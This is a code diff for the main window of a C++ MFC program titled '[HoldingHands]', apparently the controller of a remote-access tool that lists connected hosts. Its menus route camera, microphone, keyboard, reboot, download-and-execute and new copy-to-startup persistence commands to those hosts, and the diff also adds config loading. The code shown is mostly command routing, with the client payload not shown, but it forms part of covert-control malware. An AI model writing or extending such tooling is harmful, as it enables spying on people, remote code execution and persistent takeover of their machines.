@@ -10,6 +10,7 @@
 #include "ClientContext.h"
 #include "BuildDlg.h"
 #include "SettingDlg.h"
+#include "utils.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -51,10 +52,12 @@ BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
 	ON_COMMAND(ID_OPERATION_CAMERA, &CMainFrame::OnOperationCamera)
 	ON_COMMAND(ID_SESSION_RESTART, &CMainFrame::OnSessionRestart)
 	ON_COMMAND(ID_OPERATION_MICROPHONE, &CMainFrame::OnOperationMicrophone)
-	ON_COMMAND(ID_OPERATION_DOWNLOADANDEXEC, &CMainFrame::OnOperationDownloadandexec)
 	ON_COMMAND(ID_MAIN_BUILD, &CMainFrame::OnMainBuild)
 	ON_COMMAND(ID_MAIN_SETTINGS, &CMainFrame::OnMainSettings)
 	ON_COMMAND(ID_OPERATION_KEYBOARD, &CMainFrame::OnOperationKeyboard)
+	ON_COMMAND(ID_UTILS_ADDTO, &CMainFrame::OnUtilsAddto)
+	ON_COMMAND(ID_UTILS_COPYTOSTARTUP, &CMainFrame::OnUtilsCopytostartup)
+	ON_COMMAND(ID_UTILS_DOWNLOADANDEXEC, &CMainFrame::OnUtilsDownloadandexec)
 END_MESSAGE_MAP()
 
 static UINT indicators[] =
@@ -76,18 +79,29 @@ CMainFrame::CMainFrame()
 	m_pServer = NULL;
 	m_bExitAfterStop = FALSE;
 	m_listenPort = 10086;
+
+	TCHAR szPath[MAX_PATH];
+	GetProcessDirectory(szPath);
+	CString strPath(szPath);
+	strPath += "\\config\\config.json";
+	m_config.LoadConfig(CW2A(strPath).m_psz);
 }
 
 CMainFrame::~CMainFrame()
 {
+	TCHAR szPath[MAX_PATH];
+	GetProcessDirectory(szPath);
+	CString strPath(szPath);
+	strPath += "\\config\\config.json";
+	m_config.SaveConfig(CW2A(strPath).m_psz);
 }
 
-wchar_t* wszSvrStatu[] =
+TCHAR* szSrvStatu[] =
 {
-	L"Starting",
-	L"Started",
-	L"Stopping",
-	L"Stopped",
+	TEXT("Starting"),
+	TEXT("Running"),
+	TEXT("Stopping"),
+	TEXT("Stopped"),
 };
 
 int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
@@ -142,7 +156,7 @@ BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
 
 	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
 	cs.lpszClass = AfxRegisterWndClass(0);
-	cs.lpszName = L"[HoldingHands]";
+	cs.lpszName = TEXT("[HoldingHands]");
 	
 	return TRUE;
 }
@@ -193,26 +207,25 @@ void CMainFrame::OnUpdateStatuBar()
 	m_wndStatusBar.SetPaneText(5, PaneText);
 	//更新上传,下载速度.
 	DWORD UpSpeed = 0, DoSpeed = 0;
-	if (m_pServer)
-	{
+	if (m_pServer){
 		UpSpeed = m_pServer->GetWriteSpeed();
 		DoSpeed = m_pServer->GetReadSpeed();
 	}
-	PaneText.Format(L"Upload: %dKB/S", UpSpeed);
+	PaneText.Format(TEXT("Upload: %dKB/S"), UpSpeed);
 	m_wndStatusBar.SetPaneText(3, PaneText);
 
-	PaneText.Format(L"Download: %dKB/s", DoSpeed);
+	PaneText.Format(TEXT("Download: %dKB/s"), DoSpeed);
 	m_wndStatusBar.SetPaneText(4, PaneText);
 
 	//HostCount
-	PaneText.Format(L"Host: %d", m_ClientList.GetItemCount());
+	PaneText.Format(TEXT("Host: %d"), m_ClientList.GetItemCount());
 	m_wndStatusBar.SetPaneText(1, PaneText);
 	//Selected Count
-	PaneText.Format(L"Selected: %d", m_ClientList.GetSelectedCount());
+	PaneText.Format(TEXT("Selected: %d"), m_ClientList.GetSelectedCount());
 	m_wndStatusBar.SetPaneText(2, PaneText);
 	//ServerStatu
 
-	PaneText.Format(L"SrvStatu: %s", wszSvrStatu[m_ServerStatu]);
+	PaneText.Format(TEXT("ServerStatu: %s"), szSrvStatu[m_ServerStatu]);
 	m_wndStatusBar.SetPaneText(0, PaneText);
 }
 void CMainFrame::OnTimer(UINT_PTR nIDEvent)
@@ -234,17 +247,15 @@ void CMainFrame::OnTimer(UINT_PTR nIDEvent)
 void CMainFrame::OnMainStartserver()
 {
 	// TODO:  在此添加命令处理程序代码
-	if (m_ServerStatu == SVR_STATU_STARTED)
-	{
+	if (m_ServerStatu == SVR_STATU_STARTED){
 		m_ServerStatu = SVR_STATU_STOPPING;
 		//移除所有客户端
 		m_ClientList.DeleteAllItems();
-		m_pServer->AsyncStopSvr();
+		m_pServer->AsyncStopSrv();
 	}
-	if (m_ServerStatu == SVR_STATU_STOPPED)
-	{
+	if (m_ServerStatu == SVR_STATU_STOPPED){
 		m_ServerStatu = SVR_STATU_STARTING;
-		m_pServer->AsyncStartSvr(m_listenPort);
+		m_pServer->AsyncStartSrv(m_listenPort);
 	}
 }
 
@@ -286,7 +297,7 @@ void CMainFrame::OnClose()
 	//关闭服务器.(如果已经关闭了也没事,也会继续通知的)
 	m_ServerStatu = SVR_STATU_STOPPING;
 	m_bExitAfterStop = TRUE;
-	m_pServer->AsyncStopSvr();
+	m_pServer->AsyncStopSrv();
 }
 
 
@@ -312,36 +323,17 @@ LRESULT CMainFrame::OnSvrStopped(WPARAM wParam, LPARAM lParam)
 	m_ServerStatu = SVR_STATU_STOPPED;
 	/*Log(L"Server has stopped.");*/
 	//退出程序
-	if (m_bExitAfterStop)
-	{
+	if (m_bExitAfterStop){
+
 		//在这里做一些清理的工作
 		CIOCPServer::DeleteServer();
 		m_pServer = NULL;
 		KillTimer(10086);
 		//clean:
-
 		DestroyWindow();
 	}
 	return 0;
 }
-
-/*************************************************************************
-								*日志记录
-**************************************************************************/
-//void CMainFrame::Log(CString text)
-//{
-//	DWORD dwTextLength = 0;
-//	CTime time = CTime::GetTickCount();
-//	CString LogText;
-//	LogText = time.Format("[%Y-%m-%d %H:%M:%S]: ");
-//	LogText += text;
-//	LogText += "\r\n";
-//
-//	dwTextLength = m_Log.GetWindowTextLengthW();
-//	m_Log.SetSel(dwTextLength,dwTextLength,0);
-//	m_Log.ReplaceSel(LogText);
-//}
-
 
 
 /********************************************************************************
@@ -351,16 +343,14 @@ LRESULT CMainFrame::OnSvrStopped(WPARAM wParam, LPARAM lParam)
 
 ********************************************************************************/
 
-LRESULT CMainFrame::OnSocketConnect(WPARAM wParam, LPARAM lParam)
-{
+LRESULT CMainFrame::OnSocketConnect(WPARAM wParam, LPARAM lParam){
 	CClientContext*pContext = (CClientContext*)wParam;
-	return CManager::HandlerInit(pContext, lParam);
+	return m_pServer->GetMsgManager()->handler_init(pContext, lParam);
 }
 
-LRESULT CMainFrame::OnSocketClose(WPARAM wParam, LPARAM lParam)
-{
+LRESULT CMainFrame::OnSocketClose(WPARAM wParam, LPARAM lParam){
 	CClientContext*pContext = (CClientContext*)wParam;
-	return CManager::HandlerTerm(pContext, lParam);
+	return m_pServer->GetMsgManager()->handler_term(pContext, lParam);
 }
 
 //不在MainFrame里面加消息映射,菜单始终是灰色的mmp.
@@ -379,7 +369,6 @@ void CMainFrame::OnPowerReboot(){
 void CMainFrame::OnOperationEditcomment(){
 	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_EDITCOMMENT, 0);
 }
-
 
 void CMainFrame::OnUpdateMainExit(CCmdUI *pCmdUI)
 {
@@ -433,10 +422,6 @@ void CMainFrame::OnOperationMicrophone()
 }
 
 
-void CMainFrame::OnOperationDownloadandexec(){
-	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_DOWNLOADANDEXEC, 0);
-}
-
 
 void CMainFrame::OnMainBuild(){
 	CBuildDlg dlg;
@@ -445,11 +430,29 @@ void CMainFrame::OnMainBuild(){
 
 
 void CMainFrame::OnMainSettings(){
-	CSettingDlg dlg(this);
+	CSettingDlg dlg(m_config,this);
 	dlg.DoModal();
 }
 
 
 void CMainFrame::OnOperationKeyboard(){
 	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_KEYBOARD, 0);
+}
+
+
+void CMainFrame::OnUtilsAddto()
+{
+	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_UTILS_ADDTO, 0);
+}
+
+
+void CMainFrame::OnUtilsCopytostartup()
+{
+	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_UTILS_COPYTOSTARTUP, 0);
+}
+
+
+void CMainFrame::OnUtilsDownloadandexec()
+{
+	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_UTILS_DOWNLOADANDEXEC, 0);
 }
